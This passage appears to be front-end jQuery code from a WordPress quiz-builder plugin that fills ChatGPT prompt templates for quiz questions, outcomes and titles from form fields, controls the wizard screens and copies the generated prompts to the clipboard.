	if(jQuery('input[name=chatgpt_mquestion_choice]:checked').val() == 'ai_question'){
	if(c_limit.length > 0){
			mynewval = mynewval.replaceAll('%%AI_QTYPE%%',c_limit.join(','));
			}else{
				mynewval = mynewval.replaceAll('%%AI_QTYPE%%','');
			}
	}

	var mynewval = mynewval.replaceAll('%%TITLE%%',topic_name);
	mynewval = mynewval.replaceAll('%%TOTAL%%',total);
	mynewval = mynewval.replaceAll('%%TYPE%%',q_ltype);
	mynewval = mynewval.replaceAll('%%ADDITIONAL%%',''+additional);
	mynewval = mynewval.replaceAll('%%TITLE%%',topic_name);
	mynewval = mynewval.replaceAll('%%SELECTED_TYPE%%',q_ftype);
	var quiz_lang = jQuery('#chatgpt_quiz_lang').val();
	mynewval = mynewval.replaceAll('%%QUIZ_LANG%%',''+quiz_lang+'');
	var chatgpt_mquestion_additional = jQuery('#chatgpt_mquestion_additional').val();
	if(chatgpt_mquestion_additional != ''){
		mynewval = mynewval.replaceAll('%%GOAL%%','\nGoal: '+chatgpt_mquestion_additional);
	}else{
		mynewval = mynewval.replaceAll('%%GOAL%%','');
	}
	var outcome_titles = [];
	jQuery.each(sqbchatGpt['sel_outcomes'], function(i, outcome) {
		outcome_titles.push(outcome.title);
	});
	mynewval = mynewval.replaceAll('%%OUTCOME_TITLES%%',outcome_titles.join('\n'));
	
	 if(type == 'survey'){
		jQuery('#chatgpt_questionsprompt_format_code').html(mynewval);
		jQuery('#chatgpt_questionsprompt_format_code_popup').html(mynewval);
	}else{
		jQuery('#chatgpt_questionsprompt_format_code').html(chatgpt_question_prompt_d_org+mynewval);
		jQuery('#chatgpt_questionsprompt_format_code_popup').html(chatgpt_question_prompt_d_copy+mynewval);
	}
	jQuery('.chatgpt-quiz-questions-mscreen').hide();
	jQuery('.chatgpt-quiz-questionsprompt-mscreen').show();
});
chatgpt_outcome_mprompt_d_org = 'I need detailed and relevant quiz results for my quiz titled';
chatgpt_outcome_mprompt_d_copy = 'I need some additional quiz results for my quiz';
chatgpt_outcome_mprompt_ptype = '\nUse outcome-based mapping to determine result.';
chatgpt_outcome_mprompt_stype = '';
var chatgpt_outcome_mprompt_d = '<?php echo str_replace("'","\'",$data_ai_prompt["outcome_prompt"]) ?>';

jQuery(document).on('click','.chatgpt_generate_quiz_moutcome_prompt',function(){
	var chatgpt_moutcome_limit = jQuery('#chatgpt_moutcome_limit').val();
	var additional = jQuery('#chatgpt_mquestion_additional').val();

	if(jQuery('input[name=chatgpt_moutcome_choice]:checked').val() == 'ai_outcome'){
		var chatgpt_moutcome_limit = '';
	}else{

		if(chatgpt_moutcome_limit == ''){
			chatgpt_moutcome_limit = 0;
		}
		if(chatgpt_moutcome_limit < 1){
			sqb_sweet_message('',"Please enter outcome limit","");
			return false;
		}
		
	}
	var topic_name = jQuery('#chatgpt_mtitle').val();
	if(sqbchatGpt.quiz_type == 'scoring'){
		var mprompt_html = chatgpt_outcome_mprompt_d.replaceAll('%%QTYPE%%','');
	}else if(sqbchatGpt.quiz_type == 'survey'){
		var mprompt_html = chatgpt_outcome_mprompt_d.replaceAll('%%QTYPE%%','');
		mprompt_html = mprompt_html.replaceAll(',"range":""','');
	}else{
		var mprompt_html = chatgpt_outcome_mprompt_d.replaceAll('%%QTYPE%%',chatgpt_outcome_mprompt_ptype);
		mprompt_html = mprompt_html.replaceAll(',"range":""','');
	}
	
	if(jQuery('input[name=chatgpt_moutcome_choice]:checked').val() == 'ai_outcome'){
		mprompt_html = mprompt_html.replaceAll('%%OUTCOME_LIMIT%%','');
	}else{
		mprompt_html = mprompt_html.replaceAll('%%OUTCOME_LIMIT%%','\n\n4) Total # of outcomes: '+chatgpt_moutcome_limit);
	}
	mprompt_html = mprompt_html.replaceAll('%%TITLE%%',topic_name);
	mprompt_html = mprompt_html.replaceAll('%%ADDITIONAL%%','Goal: '+additional);
	var quiz_lang = jQuery('#chatgpt_quiz_lang').val();
	mprompt_html = mprompt_html.replaceAll('%%QUIZ_LANG%%','Language: Response in '+quiz_lang+'');

	jQuery('#chatgpt_outcomeprompt_format_code').html(chatgpt_outcome_mprompt_d_org+mprompt_html);
	jQuery('#chatgpt_outcomeprompt_format_code_popup').html(chatgpt_outcome_mprompt_d_copy+mprompt_html);
	jQuery('.chatgpt-quiz-outcome-mscreen').hide();
	jQuery('.chatgpt-quiz-outcomeprompt-mscreen').show();
	//jQuery('.chatgpt_mprompt_format').html(mprompt_html);
});
jQuery(document).on('click','.chatgpt_manual_generate_title', function(){
	var chatgpt_goal = jQuery('#chatgpt_goal').val();
	jQuery('.chatgpt-error-field').hide();
	if(jQuery('input[name=chatgpt_quiz_ntype]:checked').val() == 'survey'){
		jQuery('.chatgpt-error-field').hide();
		if (jQuery('input[name="survey_type"]:checked').length < 1) {
			jQuery('.survey-type-wrapper .chatgpt-error-field').show();
			return false;
		}

		if (jQuery('input[name="survey_type"]:checked').length > 0 && jQuery('#chatgpt_survay_goal').val() == '') {
			jQuery('.survey-goal-wrapper .chatgpt-error-field').show();
			return false;
		}

		if (jQuery('#chatgpt_survaycontent').val() == '') {
			jQuery('.survey-describe .chatgpt-error-field').show();
			return false;
		}

	}else{
		if(chatgpt_goal == ''){
			sqb_sweet_message('',"Please enter a Goal","");
			return false;
		}
	}
	
	jQuery('.chatgpt-quiz-common-info').hide();
	jQuery('.chagpt-quiz-title-response').hide();
	jQuery('.chatgpt_regenerate_title').hide();
	jQuery('.chatgot-quiz-title-response-main').show();

	jQuery('.chatgot-quiz-title-response-main .chatgpt-section-heading').hide();
	jQuery('.chatgot-quiz-title-response-main .chatgpt-section-content').hide();
	jQuery('.chatgot-quiz-title-response-main .chatgpt-section-heading-own-title').show();
	
	jQuery('.chatgpt_other_title').addClass('remove-or-value');
	sqbchatGpt['quiz_type'] = jQuery('input[name="chatgpt_quiz_ntype"]:checked').val();
	chatgpt_scrollto();
});
jQuery(document).on('click','.chatgpt_generate_title', function(){
	jQuery('.chagpt-quiz-title-response').show();
	jQuery('.chatgpt_regenerate_title').show();
	jQuery('.chatgpt_other_title').removeClass('remove-or-value');
	chatgpt_scrollto();
});
jQuery(document).on('click','.chatgpt_generate_mtitle, .chatgpt_mback, .chatgpt_generate_quiz_mquestions_prompt, .chatgpt_generate_quiz_mquestions, .chatgpt_generate_mquestion_list, .chatgpt_to_outcome_mscreen, .chatgpt_generate_quiz_moutcome_prompt, .chatgpt_generate_quiz_moutcome, .chatgpt_generate_moutcome, .chatgpt_to_createquiz_mscreen', function(){
	chatgpt_scrollto();
});
jQuery(document).ready(function() {
  /*jQuery(".copy-icon").click(function() {
  	var thisvar = jQuery(this);
  	var code_container = jQuery(this).parents('.code-container');
    var code = code_container.find("code").text();
    var code = code.replace(/<br>/g, "\n");
    copyToClipboard(code);
    thisvar.find('i').text("Copied!");
    setTimeout(function() {
      thisvar.find('i').text("Copy Code");
    }, 2000);
  });*/
});
function sqb_copy_to_clipboardNew(obj) {
	var elementId = jQuery(obj).attr("data-id");
	var code = jQuery('#'+elementId).text();
    var code = code.replace(/<br>/g, "\n");
    copyToClipboard(code);
    jQuery(obj).find('i').text("Copied!");
    setTimeout(function() {
      jQuery(obj).find('i').text("Copy Code");
    }, 2000);
}
function copyToClipboard(text) {
  var tempInput = jQuery("<textarea>");
  jQuery("body").append(tempInput);
  tempInput.val(text).select();
  document.execCommand("copy");
  tempInput.remove();
}
</script>